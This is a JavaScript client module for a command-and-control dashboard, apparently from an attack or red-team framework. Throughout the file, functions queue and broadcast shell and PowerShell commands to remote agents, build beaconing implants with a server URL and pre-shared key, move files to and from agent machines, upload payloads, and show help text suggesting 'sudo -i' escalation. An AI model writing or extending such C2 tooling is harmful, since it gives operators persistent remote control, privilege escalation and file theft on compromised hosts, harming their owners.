export function getApiBase() {
  if (import.meta.env.VITE_C2_API_URL) {
    return import.meta.env.VITE_C2_API_URL.replace(/\/$/, '');
  }
  if (typeof window !== 'undefined' && window.location.port === '5173') {
    return '';
  }
  return typeof window !== 'undefined' ? window.location.origin : '';
}

export function getWsUrl() {
  if (import.meta.env.VITE_C2_WS_URL) {
    return import.meta.env.VITE_C2_WS_URL;
  }
  if (typeof window === 'undefined') return 'ws://localhost:3443/api/dashboard/ws';
  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  if (window.location.port === '5173') {
    return `${protocol}//${window.location.hostname}:5173/api/dashboard/ws`;
  }
  return `${protocol}//${window.location.host}/api/dashboard/ws`;
}

export function getDefaultServerUrl() {
  if (import.meta.env.VITE_C2_API_URL) {
    return import.meta.env.VITE_C2_API_URL.replace(/\/$/, '');
  }
  if (typeof window !== 'undefined' && window.location.port === '5173') {
    return 'https://localhost:3443';
  }
  return typeof window !== 'undefined' ? window.location.origin : 'https://localhost:3443';
}

export function generatePsk() {
  const bytes = crypto.getRandomValues(new Uint8Array(16));
  return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
}

export async function queueAgentCommand(agentId, payload, commandType = 'shell') {
  const res = await fetch(`${getApiBase()}/api/command/queue`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ agent_id: agentId, command_type: commandType, payload }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Failed to queue command (${res.status})`);
  }
  return res.json();
}

export async function eliminateSession(agentId) {
  const res = await fetch(`${getApiBase()}/api/agents/${agentId}/session/kill`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Failed to eliminate session (${res.status})`);
  }
  return res.json();
}

export async function broadcastCommand(command, filters = {}, commandType = 'shell') {
  const res = await fetch(`${getApiBase()}/api/command/broadcast`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      command,
      command_type: commandType,
      filters: { os: filters.os ?? [], status: filters.status ?? ['online'] },
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Broadcast failed (${res.status})`);
  }
  return res.json();
}

export async function fetchBroadcastHistory() {
  const res = await fetch(`${getApiBase()}/api/command/broadcast/history`);
  if (!res.ok) throw new Error(`Failed to fetch broadcast history (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

export async function fetchAgentResults(agentId) {
  const res = await fetch(`${getApiBase()}/api/agents/${agentId}/results`);
  if (!res.ok) throw new Error(`Failed to fetch results (${res.status})`);
  return res.json();
}

export async function fetchPayloadSessions() {
  const res = await fetch(`${getApiBase()}/api/payloads/sessions`);
  if (!res.ok) throw new Error(`Failed to fetch payload sessions (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

export async function buildAgent({ targetOs, serverUrl, psk, beaconInterval }) {
  const res = await fetch(`${getApiBase()}/api/agents/build`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      target_os: targetOs,
      server_url: serverUrl,
      psk,
      beacon_interval: beaconInterval,
    }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Build failed (${res.status})`);
  }
  return res.json();
}

export async function fetchAgentBuilds() {
  const res = await fetch(`${getApiBase()}/api/agents/builds`);
  if (!res.ok) throw new Error(`Failed to fetch builds (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

export function getAgentDownloadUrl(buildId) {
  return `${getApiBase()}/api/agents/download/${buildId}`;
}

export function uploadFileToAgent(agentId, file, destPath, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);
    if (destPath) formData.append('dest_path', destPath);

    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable && onProgress) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error('Invalid server response'));
        }
      } else {
        reject(new Error(xhr.responseText || `Upload failed (${xhr.status})`));
      }
    });

    xhr.addEventListener('error', () => reject(new Error('Network error during upload')));
    xhr.open('POST', `${getApiBase()}/api/files/upload/${agentId}`);
    xhr.send(formData);
  });
}

export async function downloadFileFromAgent(agentId, filePath) {
  const res = await fetch(`${getApiBase()}/api/files/download/${agentId}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ file_path: filePath }),
  });
  if (!res.ok) {
    const text = await res.text().catch(() => res.statusText);
    throw new Error(text || `Download request failed (${res.status})`);
  }
  return res.json();
}

export async function fetchTransferStatus(transferId) {
  const res = await fetch(`${getApiBase()}/api/files/${transferId}`);
  if (!res.ok) throw new Error(`Failed to fetch transfer (${res.status})`);
  return res.json();
}

export async function fetchAgentTransfers(agentId) {
  const res = await fetch(`${getApiBase()}/api/files/agent/${agentId}`);
  if (!res.ok) throw new Error(`Failed to fetch transfers (${res.status})`);
  const data = await res.json();
  return Array.isArray(data) ? data : [];
}

export function uploadPayload(file, onProgress) {
  return new Promise((resolve, reject) => {
    const xhr = new XMLHttpRequest();
    const formData = new FormData();
    formData.append('file', file);

    xhr.upload.addEventListener('progress', (e) => {
      if (e.lengthComputable && onProgress) {
        onProgress(Math.round((e.loaded / e.total) * 100));
      }
    });

    xhr.addEventListener('load', () => {
      if (xhr.status >= 200 && xhr.status < 300) {
        try {
          resolve(JSON.parse(xhr.responseText));
        } catch {
          reject(new Error('Invalid server response'));
        }
      } else {
        reject(new Error(xhr.responseText || `Upload failed (${xhr.status})`));
      }
    });

    xhr.addEventListener('error', () => reject(new Error('Network error during upload')));
    xhr.open('POST', `${getApiBase()}/api/payloads/upload`);
    xhr.send(formData);
  });
}

export function resolveCommandType(agent, command) {
  const trimmed = command.trim().toLowerCase();
  if (trimmed.startsWith('powershell ') || trimmed === 'powershell') {
    return { commandType: 'powershell', payload: command.replace(/^powershell\s+/i, '') };
  }
  if (trimmed.startsWith('sleep ')) {
    return { commandType: 'sleep', payload: trimmed.replace(/^sleep\s+/, '') };
  }
  return { commandType: 'shell', payload: command };
}

export function formatRelativeTime(isoString) {
  if (!isoString) return 'never';
  const diff = Date.now() - new Date(isoString).getTime();
  const secs = Math.floor(diff / 1000);
  if (secs < 60) return `${secs}s ago`;
  const mins = Math.floor(secs / 60);
  if (mins < 60) return `${mins}m ago`;
  const hours = Math.floor(mins / 60);
  if (hours < 24) return `${hours}h ago`;
  return `${Math.floor(hours / 24)}d ago`;
}

export function getLocalHelpText(agent) {
  const os = (agent?.os ?? '').toLowerCase();
  const shellHint = os.includes('windows')
    ? 'shell commands run via cmd /K (persistent — cd and env vars persist)'
    : 'shell commands run via sh (persistent — cd, sudo sessions, env vars persist)';

  return [
    'C2 Session CLI — commands queued via POST /api/command/queue',
    'Delivery happens on next HTTPS beacon. Shell is persistent — cd and sudo carry over.',
    '',
    'Local commands:',
    '  help              — show this message',
    '',
    'Queued on agent:',
    '  whoami            — current user',
    '  cd /path && pwd   — change directory (persists for future commands)',
    '  sudo -i           — escalate (session persists in shell)',
    '  dir / ls          — list directory',
    '  sleep 5           — agent sleeps 5 seconds',
    `  powershell ...    — Windows PowerShell (${shellHint})`,
    '',
    'Click "Eliminate Session" to kill the persistent shell and reset cwd.',
  ].join('\n');
}
